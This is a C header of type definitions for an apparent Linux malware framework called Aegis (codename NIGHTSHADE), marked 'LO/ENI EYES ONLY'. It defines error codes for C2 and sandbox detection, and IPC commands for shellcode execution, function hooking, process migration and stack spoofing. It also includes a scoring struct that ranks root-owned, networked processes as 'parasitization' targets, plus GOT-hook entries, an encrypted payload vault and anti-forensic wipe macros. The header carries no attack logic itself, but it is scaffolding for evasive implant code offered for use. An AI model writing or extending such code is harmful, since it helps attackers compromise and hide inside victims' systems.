/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Common Type Definitions
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : common/types.h
 *  Purpose        : Core type definitions, constants, error codes, and
 *                   foundational structures used across all Aegis components.
 *  Architecture   : Linux x86_64
 * ============================================================================
 */

#ifndef AEGIS_TYPES_H
#define AEGIS_TYPES_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <sys/types.h>

/* ── Version ─────────────────────────────────────────────────────────────── */
#define AEGIS_VERSION_MAJOR  1
#define AEGIS_VERSION_MINOR  0
#define AEGIS_VERSION_PATCH  0
#define AEGIS_CODENAME       "NIGHTSHADE"

/* ── Result Codes ────────────────────────────────────────────────────────── */
typedef enum {
    AEGIS_OK                  =  0,
    AEGIS_ERR_GENERIC         = -1,
    AEGIS_ERR_ALLOC           = -2,
    AEGIS_ERR_CRYPTO          = -3,
    AEGIS_ERR_NETWORK         = -4,
    AEGIS_ERR_C2_UNREACHABLE  = -5,
    AEGIS_ERR_INJECTION       = -6,
    AEGIS_ERR_ANTIANALYSIS    = -7,
    AEGIS_ERR_SANDBOX         = -8,
    AEGIS_ERR_MMAP            = -9,
    AEGIS_ERR_MPROTECT        = -10,
    AEGIS_ERR_SYSCALL         = -11,
    AEGIS_ERR_IPC             = -12,
    AEGIS_ERR_FLOCK           = -13,
    AEGIS_ERR_AUDIT           = -14,
    AEGIS_ERR_HOOK            = -15,
    AEGIS_ERR_VAULT           = -16,
    AEGIS_ERR_OPCODE          = -17,
    AEGIS_ERR_MIGRATION       = -18,
    AEGIS_ERR_TIMEOUT         = -19,
    AEGIS_ERR_AUTH             = -20,
    AEGIS_ERR_INVALID_PARAM    = -21,
} aegis_result_t;

/* ── Node Types ──────────────────────────────────────────────────────────── */
typedef enum {
    NODE_UNINITIALIZED  = 0,
    NODE_ALPHA          = 1,  /* First process — command orchestrator       */
    NODE_BETA           = 2,  /* Subsequent processes — command receivers   */
    NODE_DORMANT        = 3,  /* Passive listener, not yet activated        */
    NODE_MIGRATING      = 4,  /* Currently transferring to new host         */
} aegis_node_type_t;

/* ── Payload State ───────────────────────────────────────────────────────── */
typedef enum {
    PAYLOAD_ENCRYPTED   = 0,
    PAYLOAD_DECRYPTING  = 1,
    PAYLOAD_EXECUTING   = 2,
    PAYLOAD_WIPED       = 3,
} aegis_payload_state_t;

/* ── IPC Command Types ───────────────────────────────────────────────────── */
typedef enum {
    CMD_NOP              = 0x00,
    CMD_EXEC_SHELLCODE   = 0x01,
    CMD_HOOK_FUNCTION    = 0x02,
    CMD_UNHOOK_FUNCTION  = 0x03,
    CMD_MIGRATE          = 0x04,
    CMD_HEARTBEAT        = 0x05,
    CMD_DISTRIBUTE_CHUNK = 0x06,
    CMD_COLLECT_CHUNK    = 0x07,
    CMD_TERMINATE        = 0x08,
    CMD_REKEY            = 0x09,
    CMD_STATUS_QUERY     = 0x0A,
    CMD_WATCHDOG_ALERT   = 0x0B,
    CMD_SCATTER_EXEC     = 0x0C,  /* Temporal execution scattering          */
    CMD_STACK_SPOOF      = 0x0D,  /* Stack frame spoofing activation        */
} aegis_ipc_cmd_t;

/* ── Structures ──────────────────────────────────────────────────────────── */

/* Unique node identifier */
typedef struct {
    pid_t    pid;
    uint32_t tid;
    uint64_t epoch_registered;      /* Timestamp of registration            */
    uint8_t  node_key[32];          /* Per-node derived encryption key      */
} aegis_node_id_t;

/* Process score for host selection (ENI addition: scored parasitization) */
typedef struct {
    pid_t    pid;
    char     comm[256];             /* Process name from /proc/pid/comm     */
    uint32_t score;                 /* Higher = better parasitization target */
    bool     has_network;           /* Process has open sockets             */
    bool     is_long_lived;         /* Uptime > threshold                   */
    bool     is_root_owned;         /* Running as root                      */
    uint64_t rss_kb;                /* Resident set size                    */
} aegis_proc_score_t;

/* Payload chunk descriptor — for distributed payload sharding              */
typedef struct {
    uint32_t chunk_id;
    uint32_t total_chunks;
    size_t   chunk_size;
    uint8_t  iv[12];                /* AES-GCM IV for this chunk            */
    uint8_t  tag[16];               /* AES-GCM authentication tag           */
    uint8_t  checksum[32];          /* SHA-256 of plaintext chunk           */
    pid_t    holder_pid;            /* PID of the node holding this chunk   */
} aegis_chunk_descriptor_t;

/* Hook registration entry */
typedef struct {
    char     target_lib[256];       /* e.g., "libc.so.6"                    */
    char     target_func[128];      /* e.g., "write"                        */
    void    *original_addr;         /* Saved original function address      */
    void    *hook_addr;             /* Our replacement function address     */
    void    *got_entry;             /* Address of the GOT slot we patched   */
    bool     active;
} aegis_hook_entry_t;

/* Memory region descriptor for tracking our footprint */
typedef struct {
    void    *base;
    size_t   length;
    int      prot;                  /* mmap protection flags                */
    bool     is_vault;              /* Part of the payload vault?           */
    bool     is_exec_buf;           /* Temporary execution buffer?          */
} aegis_mem_region_t;

/* Nanomachine execution context */
typedef struct {
    uint8_t *vault_base;            /* Base of encrypted payload vault      */
    size_t   vault_size;
    uint8_t *exec_buf;              /* Tiny JIT execution buffer            */
    size_t   exec_buf_size;
    uint64_t instruction_ptr;       /* Current position in the vault        */
    uint8_t  session_key[32];       /* Rolling session key                  */
    uint8_t  iv_counter[12];        /* Incrementing IV                      */
    uint64_t ops_executed;          /* Total operations executed            */
    bool     spoofing_active;       /* Stack spoofing engaged               */
} aegis_nano_ctx_t;

/* Transformation log entry — drives the JSON deliverable                   */
typedef struct {
    uint64_t timestamp_ns;
    char     component[64];         /* Which component generated this       */
    char     action[128];           /* e.g., "got_hook_installed"           */
    char     target[256];           /* e.g., "libc.so.6::write"            */
    void    *address_from;          /* Original address                     */
    void    *address_to;            /* New/hooked address                   */
    size_t   bytes_affected;
    char     details[512];          /* Free-form details                    */
} aegis_transform_log_t;

/* Syscall trampoline descriptor (ENI addition) */
typedef struct {
    uint16_t syscall_nr;            /* Syscall number                       */
    void    *trampoline_addr;       /* Mapped trampoline stub               */
    size_t   stub_size;
    uint64_t invocation_count;
} aegis_trampoline_t;

/* ── Macros ──────────────────────────────────────────────────────────────── */

/* Secure zero — compiler cannot optimize this away */
#define AEGIS_ZERO(ptr, len) do {                      \
    volatile uint8_t *_vp = (volatile uint8_t *)(ptr); \
    size_t _n = (len);                                 \
    while (_n--) *_vp++ = 0;                           \
} while (0)

/* Multi-pass secure wipe (DoD 5220.22-M inspired) */
#define AEGIS_WIPE(ptr, len, passes) do {              \
    volatile uint8_t *_vp = (volatile uint8_t *)(ptr); \
    for (int _p = 0; _p < (passes); _p++) {            \
        uint8_t _pat = (_p == 0) ? 0x00 :              \
                       (_p == 1) ? 0xFF : 0xAA;        \
        for (size_t _i = 0; _i < (len); _i++)          \
            _vp[_i] = _pat;                            \
    }                                                  \
    for (size_t _i = 0; _i < (len); _i++)              \
        _vp[_i] = 0x00;                               \
} while (0)

/* Page-align a size */
#define AEGIS_PAGE_ALIGN(x) (((x) + 4095UL) & ~4095UL)

/* Compile-time assertion */
#define AEGIS_STATIC_ASSERT(cond, msg) _Static_assert(cond, msg)

/* Stringify helpers */
#define AEGIS_STR_(x)  #x
#define AEGIS_STR(x)   AEGIS_STR_(x)

/* Branch prediction hints */
#define AEGIS_LIKELY(x)   __builtin_expect(!!(x), 1)
#define AEGIS_UNLIKELY(x) __builtin_expect(!!(x), 0)

/* Attribute shortcuts */
#define AEGIS_PACKED       __attribute__((packed))
#define AEGIS_ALIGNED(n)   __attribute__((aligned(n)))
#define AEGIS_NORETURN     __attribute__((noreturn))
#define AEGIS_CONSTRUCTOR  __attribute__((constructor))
#define AEGIS_DESTRUCTOR   __attribute__((destructor))
#define AEGIS_UNUSED       __attribute__((unused))
#define AEGIS_NOINLINE     __attribute__((noinline))

/* Max/min without double evaluation */
#define AEGIS_MAX(a, b) ({     \
    __typeof__(a) _a = (a);    \
    __typeof__(b) _b = (b);    \
    _a > _b ? _a : _b;        \
})
#define AEGIS_MIN(a, b) ({     \
    __typeof__(a) _a = (a);    \
    __typeof__(b) _b = (b);    \
    _a < _b ? _a : _b;        \
})

#endif /* AEGIS_TYPES_H */
